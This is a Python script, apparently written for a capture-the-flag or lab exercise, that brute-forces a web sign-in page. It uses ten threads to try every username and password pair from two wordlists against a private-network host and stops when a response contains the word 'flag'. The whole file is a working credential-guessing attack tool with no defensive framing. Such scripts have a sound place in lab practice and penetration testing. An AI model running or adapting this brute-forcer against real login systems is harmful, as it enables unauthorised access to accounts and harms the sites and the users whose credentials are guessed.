import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product
import threading
from time import sleep

USERNAMES_FILE = 'usernames.txt'
PASSWORDS_FILE = 'passwords.txt'
BASE_URL = 'http://192.168.215.139/'
PAGE = 'signin'
MAX_WORKERS = 10

found_event = threading.Event()
success_credentials = None

def load_lines(filepath):
    with open(filepath, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def try_login(username, password):
    if found_event.is_set():
        return None

    params = {
        'page': PAGE,
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    try:
        response = requests.get(BASE_URL, params=params, timeout=50)
        if "flag" in response.text:
            found_event.set()
            return (username, password)
    except requests.RequestException as e:
        print(f"[!] Error for {username}:{password} -> {e}")
    return None

def main():
    global success_credentials
    usernames = load_lines(USERNAMES_FILE)
    passwords = load_lines(PASSWORDS_FILE)
    combos = list(product(usernames, passwords))

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(try_login, u, p): (u, p) for u, p in combos}

        for future in as_completed(futures):
            result = future.result()
            if result:
                success_credentials = result
                break

    if success_credentials:
        sleep(0.5)
        print(f"\n[+] Found valid credentials: {success_credentials[0]}:{success_credentials[1]}")

if __name__ == '__main__':
    main()
